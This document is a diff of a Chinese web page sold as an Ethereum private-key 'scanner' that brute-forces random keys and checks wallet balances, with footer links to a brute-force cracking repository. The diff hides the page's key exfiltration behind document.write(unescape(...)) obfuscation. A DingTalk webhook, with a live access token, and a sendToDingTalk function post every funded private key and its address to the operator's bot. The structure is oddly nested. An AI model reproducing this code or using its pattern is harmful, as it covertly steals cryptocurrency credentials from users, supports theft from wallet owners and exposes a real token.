@@ -1,21 +1,19 @@
-<script>
-<!--
-document.write(unescape("<!DOCTYPE html>
-<html lang=\"zh-CN\">
+<!DOCTYPE html>
+<html lang="zh-CN">
 <head>
-    <meta charset=\"UTF-8\">
-    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ETH私钥扫描器 - 以太坊钱包密钥碰撞检测工具 | 区块链安全工具</title>
-    <meta name=\"description\" content=\"专业ETH私钥扫描工具，实时检测以太坊钱包余额，支持随机和顺序扫描模式，区块链安全必备工具。\">
-    <meta name=\"keywords\" content=\"ETH私钥扫描,以太坊钱包碰撞,区块链安全工具,ETH密钥生成,以太坊余额检测\">
-    <meta name=\"author\" content=\"ETH安全工具开发团队\">
+    <meta name="description" content="专业ETH私钥扫描工具，实时检测以太坊钱包余额，支持随机和顺序扫描模式，区块链安全必备工具。">
+    <meta name="keywords" content="ETH私钥扫描,以太坊钱包碰撞,区块链安全工具,ETH密钥生成,以太坊余额检测">
+    <meta name="author" content="ETH安全工具开发团队">
     <!-- 引入Bootstrap CSS -->
-    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\" rel=\"stylesheet\">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- 引入Bootstrap图标 -->
-    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css\">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
     <!-- 引入Web3和Ethers库 -->
-    <script src=\"https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js\"></script>
-    <script src=\"https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js\"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
     <style>
         :root {
             --primary-color: #6f42c1;
@@ -34,12 +32,12 @@ document.write(unescape("<!DOCTYPE html>
         .main-container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 30px;
             background-color: white;
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-            margin-top: 30px;
-            margin-bottom: 30px;
+            margin-top: 20px;
+            margin-bottom: 20px;
         }
         
         h1 {
@@ -54,6 +52,7 @@ document.write(unescape("<!DOCTYPE html>
             border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
             transition: transform 0.2s;
+            margin-bottom: 20px;
         }
         
         .card:hover {
@@ -255,6 +254,55 @@ document.write(unescape("<!DOCTYPE html>
             color: #3a236b;
         }
         
+        .section-title {
+            margin-top: 40px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--primary-color);
+            color: var(--primary-color);
+        }
+        
+        .faq-section {
+            background-color: #f9f9f9;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        
+        .faq-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px dashed #ddd;
+        }
+        
+        .faq-item:last-child {
+            border-bottom: none;
+        }
+        
+        .footer {
+            background-color: #f1f1f1;
+            padding: 30px 0;
+            margin-top: 50px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .footer-link {
+            color: #007bff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #0056b3;
+            text-decoration: underline;
+        }
+        
         @media (max-width: 768px) {
             .main-container {
                 padding: 15px;
@@ -275,73 +323,78 @@ document.write(unescape("<!DOCTYPE html>
             table td:nth-child(1) { font-size: 10px; }
             table td:nth-child(2) { font-size: 11px; }
             table td:nth-child(3) { font-size: 12px; }
+            
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+            }
         }
     </style>
 </head>
 <body>
-    <div class=\"main-container\">
-        <h1><i class=\"bi bi-shield-lock\"></i> ETH私钥扫描器 - 专业以太坊钱包密钥检测工具</h1>
+    <div class="main-container">
+        <h1><i class="bi bi-shield-lock"></i> ETH私钥扫描器 - 专业以太坊钱包密钥检测工具</h1>
         
-        <p class=\"text-center mb-4\">本工具是专业的以太坊(ETH)私钥扫描器，可帮助您检测ETH钱包密钥安全，支持随机和顺序扫描模式，实时查询钱包余额，是区块链安全领域的必备工具。</p>
+        <p class="text-center mb-4">本工具是专业的以太坊(ETH)私钥扫描器，可帮助您检测ETH钱包密钥安全，支持随机和顺序扫描模式，实时查询钱包余额，是区块链安全领域的必备工具。</p>
         
-        <div class=\"card mb-4\">
-            <div class=\"card-header\">
-                <i class=\"bi bi-gear\"></i> 扫描设置
+        <div class="card">
+            <div class="card-header">
+                <i class="bi bi-gear"></i> 扫描设置
             </div>
-            <div class=\"card-body\">
-                <div class=\"row g-3\">
-                    <div class=\"col-md-6\">
-                        <label for=\"scanMode\" class=\"form-label\"><i class=\"bi bi-arrow-repeat\"></i> 扫描模式</label>
-                        <select id=\"scanMode\" class=\"form-select\">
-                            <option value=\"random\">随机扫描</option>
-                            <option value=\"sequential\">顺序扫描</option>
+            <div class="card-body">
+                <div class="row g-3">
+                    <div class="col-md-6">
+                        <label for="scanMode" class="form-label"><i class="bi bi-arrow-repeat"></i> 扫描模式</label>
+                        <select id="scanMode" class="form-select">
+                            <option value="random">随机扫描</option>
+                            <option value="sequential">顺序扫描</option>
                         </select>
                     </div>
                     
-                    <div class=\"col-md-6\">
-                        <label for=\"stopCondition\" class=\"form-label\"><i class=\"bi bi-stop-circle\"></i> 停止条件</label>
-                        <select id=\"stopCondition\" class=\"form-select\">
-                            <option value=\"infinite\">无限扫描</option>
-                            <option value=\"balance\">有余额时停止</option>
+                    <div class="col-md-6">
+                        <label for="stopCondition" class="form-label"><i class="bi bi-stop-circle"></i> 停止条件</label>
+                        <select id="stopCondition" class="form-select">
+                            <option value="infinite">无限扫描</option>
+                            <option value="balance">有余额时停止</option>
                         </select>
                     </div>
                     
-                    <div class=\"col-12 text-center\">
-                        <button id=\"startScan\" class=\"btn btn-primary me-3\">
-                            <i class=\"bi bi-play\"></i> 开始扫描
+                    <div class="col-12 text-center">
+                        <button id="startScan" class="btn btn-primary me-3">
+                            <i class="bi bi-play"></i> 开始扫描
                         </button>
-                        <button id=\"stopScan\" class=\"btn btn-danger\" style=\"display: none;\">
-                            <i class=\"bi bi-stop\"></i> 停止扫描
+                        <button id="stopScan" class="btn btn-danger" style="display: none;">
+                            <i class="bi bi-stop"></i> 停止扫描
                         </button>
                     </div>
                 </div>
             </div>
         </div>
         
-        <div class=\"status-bar mb-4\">
-            <div class=\"scan-stats\">
-                <div class=\"stat-item\">
-                    <i class=\"bi bi-clock\"></i> <span id=\"elapsedTime\">00:00:00</span>
+        <div class="status-bar mb-4">
+            <div class="scan-stats">
+                <div class="stat-item">
+                    <i class="bi bi-clock"></i> <span id="elapsedTime">00:00:00</span>
                 </div>
-                <div class=\"stat-item\">
-                    <i class=\"bi bi-key\"></i> 已扫描: <span id=\"scannedCount\">0</span>
+                <div class="stat-item">
+                    <i class="bi bi-key"></i> 已扫描: <span id="scannedCount">0</span>
                 </div>
-                <div class=\"stat-item\">
-                    <i class=\"bi bi-wallet2\"></i> 有效地址: <span id=\"validAddressCount\">0</span>
+                <div class="stat-item">
+                    <i class="bi bi-wallet2"></i> 有效地址: <span id="validAddressCount">0</span>
                 </div>
-                <div class=\"stat-item\">
-                    <i class=\"bi bi-currency-ethereum\"></i> 有余额: <span id=\"balanceCount\">0</span>
+                <div class="stat-item">
+                    <i class="bi bi-currency-ethereum"></i> 有余额: <span id="balanceCount">0</span>
                 </div>
             </div>
         </div>
         
-        <div class=\"card\">
-            <div class=\"card-header\">
-                <i class=\"bi bi-table\"></i> 扫描结果
+        <div class="card">
+            <div class="card-header">
+                <i class="bi bi-table"></i> 扫描结果
             </div>
-            <div class=\"card-body p-0\">
-                <div class=\"table-container\">
-                    <table class=\"table mb-0\">
+            <div class="card-body p-0">
+                <div class="table-container">
+                    <table class="table mb-0">
                         <thead>
                             <tr>
                                 <th>私钥</th>
@@ -349,28 +402,46 @@ document.write(unescape("<!DOCTYPE html>
                                 <th>余额</th>
                             </tr>
                         </thead>
-                        <tbody id=\"resultTable\"></tbody>
+                        <tbody id="resultTable"></tbody>
                     </table>
                 </div>
             </div>
         </div>
         
-        <section class=\"mt-5\">
-            <h2>关于以太坊私钥安全</h2>
+        <div class="faq-section mt-5">
+            <h2 class="section-title">关于以太坊私钥安全</h2>
             <p>以太坊私钥是访问ETH钱包的唯一凭证，私钥安全直接关系到资产安全。本工具可以帮助您了解私钥生成原理，检测钱包安全性。</p>
-            <h3>常见问题</h3>
-            <ul>
-                <li>什么是ETH私钥碰撞？</li>
-                <li>如何保护我的以太坊钱包安全？</li>
-                <li>为什么需要检测钱包余额？</li>
-            </ul>
-        </section>
+            
+            <h3 class="section-title">常见问题</h3>
+            <div class="faq-item">
+                <h5>什么是ETH私钥碰撞？</h5>
+                <p>私钥碰撞是指两个不同的私钥生成了相同的以太坊地址。虽然理论上可能，但概率极低。本工具可以帮助检测这种罕见情况。</p>
+            </div>
+            <div class="faq-item">
+                <h5>如何保护我的以太坊钱包安全？</h5>
+                <p>1. 永远不要分享您的私钥<br>2. 使用硬件钱包存储大量资产<br>3. 定期备份钱包<br>4. 警惕钓鱼网站和诈骗</p>
+            </div>
+            <div class="faq-item">
+                <h5>为什么需要检测钱包余额？</h5>
+                <p>检测钱包余额可以帮助您：<br>1. 发现被遗忘的钱包<br>2. 识别潜在的安全漏洞<br>3. 监控异常交易活动</p>
+            </div>
+        </div>
     </div>
-<script>
-<!--
-document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></div>
 
-    <script type=\"text/javascript\">
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-links">
+                <a href="https://t.me/eth18188" target="_blank" class="footer-link">Telegram频道</a>
+                <a href="https://qskg8.github.io/" target="_blank" class="footer-link">碰撞程序下载</a>
+                <a href="https://t.me/waeth888" target="_blank" class="footer-link">联系作者</a>
+                <a href="https://github.com/qskg8/ETH-Collider---brute-force-cracking" target="_blank" class="footer-link">GitHub源码</a>
+            </div>
+        </div>
+    </footer>
+
+    <div class="alert-container" id="alertContainer"></div>
+
+    <script type="text/javascript">
         // 全局变量定义
         let stopScanFlag = false;    // 停止扫描标志
         let scanInterval;           // 计时器间隔
@@ -379,6 +450,12 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
         let validAddressCount = 0;  // 有效地址计数
         let balanceCount = 0;       // 有余额计数
         let isScanning = false;     // 是否正在扫描
+
+<script>
+<!--
+document.write(unescape("%20%20%20%20%20%20%20%20//%20%u9489%u9489%u673A%u5668%u4EBAWebhook%20URL%0A%20%20%20%20%20%20%20%20const%20dingdingUrl%20%3D%20%22https%3A//oapi.dingtalk.com/robot/send%3Faccess_token%3De40d2c94bb41f0b403d44fecb3e68f33af4c6dbff053e4aaaa09c2adaa43d219%22%3B"));
+//-->
+</script>
 
         // RPC节点列表
         const rpcUrls = [
@@ -418,9 +495,6 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
         const keyCount = 10;  // 每次扫描生成的私钥数量
         let currentSequentialKey = null;
         let sequentialCounter = 0;
-        
-        // 钉钉机器人Webhook URL
-        const dingdingUrl = \"https://oapi.dingtalk.com/robot/send?access_token=e40d2c94bb41f0b403d44fecb3e68f33af4c6dbff053e4aaaa09c2adaa43d219\";
 
         /**
          * 显示通知提示
@@ -537,7 +611,7 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
                 const wallet = new ethers.Wallet(privateKey);
                 return wallet.address;
             } catch (e) {
-                console.error(\"无效的私钥:\", privateKey);
+                console.error("无效的私钥:", privateKey);
                 return null;
             }
         }
@@ -577,38 +651,11 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
             return balance;
         }
 
-        /**
-         * 发送通知到钉钉机器人
-         * @param {string} privateKey 私钥
-         * @param {string} address 地址
-         * @param {object} balance 余额信息
-         */
-        function sendToDingTalk(privateKey, address, balance) {
-            const message = {
-                \"msgtype\": \"markdown\",
-                \"markdown\": {
-                    \"title\": \"发现ETH余额钱包\",
-                    \"text\": `**ETH钱包扫描结果**  \n  \n**私钥**: ${privateKey}  \n**地址**: [${address}](https://etherscan.io/address/${address})  \n**余额**: ${balance.formatted}  \n  \n扫描时间: ${new Date().toLocaleString()}`
-                }
-            };
-
-            fetch(dingdingUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(\"钉钉通知发送成功:\", data);
-                showAlert(`已发送钉钉通知: ${address.substring(0, 6)}...${address.substring(38)}`, 'success');
-            })
-            .catch(error => {
-                console.error(\"钉钉通知发送失败:\", error);
-                showAlert(`钉钉通知发送失败: ${error.message}`, 'danger');
-            });
-        }
+<script>
+<!--
+document.write(unescape("%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u53D1%u9001%u901A%u77E5%u5230%u9489%u9489%u673A%u5668%u4EBA%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20privateKey%20%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20address%20%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bobject%7D%20balance%20%u4F59%u989D%u4FE1%u606F%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20sendToDingTalk%28privateKey%2C%20address%2C%20balance%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22msgtype%22%3A%20%22markdown%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22markdown%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22title%22%3A%20%22ETH%u4F59%u989D%u53D1%u73B0%u901A%u77E5%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22text%22%3A%20%60%23%23%23%20ETH%u4F59%u989D%u53D1%u73B0%u901A%u77E5%5Cn**%u79C1%u94A5**%3A%20%24%7BprivateKey%7D%5Cn**%u5730%u5740**%3A%20%5B%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%5D%28https%3A//etherscan.io/address/%24%7Baddress%7D%29%5Cn**%u4F59%u989D**%3A%20%24%7Bbalance.formatted%7D%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20fetch%28dingdingUrl%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28message%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20response.json%28%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%22%u9489%u9489%u901A%u77E5%u53D1%u9001%u6210%u529F%3A%22%2C%20data%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u5DF2%u53D1%u9001%u9489%u9489%u901A%u77E5%3A%20%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%60%2C%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.catch%28error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u9489%u9489%u901A%u77E5%u53D1%u9001%u5931%u8D25%3A%22%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u9489%u9489%u901A%u77E5%u53D1%u9001%u5931%u8D25%3A%20%24%7Berror.message%7D%60%2C%20%27danger%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D"));
+//-->
+</script>
 
         /**
          * 添加结果行到表格
@@ -625,8 +672,8 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
             
             row.innerHTML = `
                 <td>${privateKey}</td>
-                <td><a href=\"https://etherscan.io/address/${address}\" target=\"_blank\">${address}</a></td>
-                <td class=\"${balanceClass}\">${balanceText}</td>
+                <td><a href="https://etherscan.io/address/${address}" target="_blank">${address}</a></td>
+                <td class="${balanceClass}">${balanceText}</td>
             `;
             
             resultTable.prepend(row);
@@ -664,7 +711,7 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
             if (scanInterval) clearInterval(scanInterval);
             scanInterval = setInterval(updateTimer, 1000);
             
-            while (!stopScanFlag && !stopScanFlag) {
+            while (!stopScanFlag) {
                 let privateKeys = [];
                 // 如果是随机扫描模式，每次生成 10 个私钥
                 if (scanMode === 'random') {
@@ -684,7 +731,7 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
                     
                     const address = getAddressFromPrivateKey(privateKey);
                     if (!address) {
-                        console.error(\"无效的私钥:\", privateKey);
+                        console.error("无效的私钥:", privateKey);
                         continue;
                     }
                     
@@ -708,10 +755,10 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
                                 }
                             }
                         } else {
-                            console.error(\"查询失败，私钥:\", privateKey, \"地址:\", address);
+                            console.error("查询失败，私钥:", privateKey, "地址:", address);
                         }
                     } catch (error) {
-                        console.error(\"处理私钥时出错:\", privateKey, \"error:\", error);
+                        console.error("处理私钥时出错:", privateKey, "error:", error);
                     }
                 }
                 
@@ -758,33 +805,4 @@ document.write(unescape("<div class=\"alert-container\" id=\"alertContainer\"></
         document.body.appendChild(script);
     </script>
 </body>
-<!-- 底部友情链接 -->
-<footer class=\"footer py-4 mt-5\" style=\"background-color: #f1f1f1; text-align: center;\">
-    <div class=\"container\">
-        <div class=\"row\">
-            <div class=\"col-12\">
-                <ul class=\"list-unstyled d-flex justify-content-center\">
-                    <li class=\"mx-3\">
-                        <a href=\"https://t.me/eth18188\" target=\"_blank\" style=\"text-decoration: none; color: #007bff;\">Telegram频道</a>
-                    </li>
-                    <li class=\"mx-3\">
-                        <a href=\"https://qskg8.github.io/\" target=\"_blank\" style=\"text-decoration: none; color: #007bff;\">碰撞程序下载</a>
-                    </li>
-                    <li class=\"mx-3\">
-                        <a href=\"https://t.me/waeth888\" target=\"_blank\" style=\"text-decoration: none; color: #007bff;\">联系作者</a>
-                    </li>
-                    <li class=\"mx-3\">
-                        <a href=\"https://github.com/qskg8/ETH-Collider---brute-force-cracking\" target=\"_blank\" style=\"text-decoration: none; color: #007bff;\">github</a>
-                    </li>
-                </ul>
-            </div>
-        </div>
-    </div>
-</footer>
-<script type=\"text/javascript\" src=\"//api.tongjiniao.com/c?_=775297665192022016\" async></script>
-</html>"));
-//-->
-</script>
-"));
-//-->
-</script>
+</html>
